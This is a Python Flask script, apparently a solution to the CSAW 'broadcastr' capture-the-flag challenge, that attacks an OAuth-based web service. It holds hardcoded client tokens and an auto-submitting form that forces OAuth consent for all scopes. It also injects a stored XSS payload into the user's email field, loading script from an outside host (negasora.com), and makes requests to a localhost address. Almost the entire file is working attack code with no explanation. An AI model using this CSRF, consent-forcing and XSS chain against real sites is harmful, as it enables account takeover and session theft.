from flask import Flask, redirect, url_for, session, request, jsonify, abort
from flask_oauthlib.client import OAuth
import json

redirblob = """<html>
    <head>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    </head>
    <body>
        <form id="myform" action="http://broadcastr.chal.csaw.io:4000/oauth/authorize?response_type=code&client_id=59422705acbc134833ea1c19f2ce9e30&redirect_uri=http%3A%2F%2Fnegasora.com%3A31337%2Foauth-authorized&scope=user%3Ainfo%3Aread+user%3Astatus%3Aread+user%3Ainfo%3Awrite+user%3Ahistory%3Aread" method="POST">
            <input type="text" name="confirm" value="Yes"></input>
        </form>

        <script>document.getElementById("myform").submit();</script>

    </body>
</html>"""




def create_client(app):
    tok = "0859abcd56d1e853d745e21872273890" #localhost oauth-authorized
    tok = "996af88c2414c6521d04b5de336dc5ae" #localhost oauth-authorized (all privs)
    tok = "59422705acbc134833ea1c19f2ce9e30" #negasora oauth-authorized (all privs)
    #tok = "a85a3aa37515a75aaf4b4840e5206222"
    #tok = "c587d28859a84f7abec7faa9f3aeea52"
    
    oauth = OAuth(app)

    remote = oauth.remote_app(
        'dev',
        consumer_key=tok,
        consumer_secret=tok,
        request_token_params={'scope': 'user:info:read user:status:read user:info:write user:history:read'},
        base_url='http://broadcastr.chal.csaw.io:4000/api',
        request_token_url=None,
        access_token_method='POST',
        access_token_url='http://broadcastr.chal.csaw.io:4000/oauth/token',
        authorize_url='http://broadcastr.chal.csaw.io:4000/oauth/authorize',
    )

    

    @app.route('/', methods=['GET', 'POST'])
    def index():
        if request.method == "POST":
            #print request.form
            return redirect(url_for('login'), code=307)


        if 'dev_token' in session:
            #ret = remote.get('api/user/info')
            #print ret.data
            #ret = remote.get('api/user/history')
            #print ret.data
            #ret = remote.get('api/user/status')
            #print ret.data
            ret = remote.get('http://127.0.0.1:3000/login')
            print ret.data
            #return
            print "REDIRECTING TO WRITE EMAIL"
            session['fuck'] = "pls"
            return redirect('http://negasora.com:31337/info/write?email="<i>@<script src="//negasora.com/a.js"></script>')
            print 'SET EMAIL'
            print ret.data
        if "fuck" in session:
            print "redirecting to profile"
            return redirect('http://bucket.broadcastr.chal.csaw.io:4000/profile')
            print ret.data
            return ret.data
        return redirect(url_for('login'))

    @app.route('/redir')
    def redir():
        print "REDIR BLOB"
        return redirblob

    @app.route('/fin')
    def fin():
        return redirect('http://bucket.broadcastr.chal.csaw.io:4000/profile')
    
    @app.route('/login', methods=['GET', 'POST'])
    def login():
        print request.form
        return remote.authorize(callback=url_for('authorized', _external=True))

    @app.route('/oauth-authorized')
    def authorized():
        print remote.__dict__
        resp = remote.authorized_response()
        if resp is None:
            return 'Access denied: error=%s' % (
                request.args['error']
            )
        if isinstance(resp, dict) and 'access_token' in resp:
            session['dev_token'] = (resp['access_token'], '')
            #return jsonify(resp)
            print "redirecting to write email"
            return redirect('http://negasora.com:31337/info/write?email="<i>@<script src="//negasora.com/a.js"></script>')
        return str(resp)

    @app.route('/status')
    def getstatus():
        if 'dev_token' in session:
            ret = remote.get('api/user/status')
            print ret
            return jsonify(ret.data)
        return redirect(url_for('login'))

    @app.route('/info/write')
    def writeinfo():
        if not 'email' in request.args:
            print "gib email"
            return "email pls"
        if 'dev_token' in session:
            headers = {'Content-Type' : 'application/json'}
            print "setting email"
            ret = remote.get("127.0.0.1:3000/login")
            print ret.data
            ret = remote.post('api/user/info/update', data=json.dumps({'email':str(request.args.get('email'))}), headers=headers, content_type='application/json')
            print ret
            print 'AAAAAAAAAAAAAAAAAAAAAAA'
            print ret.data
            return redirect(url_for('fin'))
            #return jsonify(ret.data)
        return redirect(url_for('fin'))

    @app.route('/info/read')
    def readinfo():
        if 'dev_token' in session:
            ret = remote.get('api/user/status')
            print ret
            return jsonify(ret.data)
        return redirect(url_for('login'))

    @app.route('/history')
    def gethistory():
        if 'dev_token' in session:
            ret = remote.get('api/user/history')
            print ret
            return jsonify(ret.data)
        return redirect(url_for('login'))

    @remote.tokengetter
    def get_oauth_token():
        return session.get('dev_token')

    return remote

if __name__ == '__main__':
    import os
    os.environ['OAUTHLIB_INSECURE_TRANSPORT'] = 'true'
    # DEBUG=1 python oauth2_client.py
    app = Flask(__name__)
    app.debug = True
    app.secret_key = 'development'
    create_client(app)
    app.run("0.0.0.0", 31337)

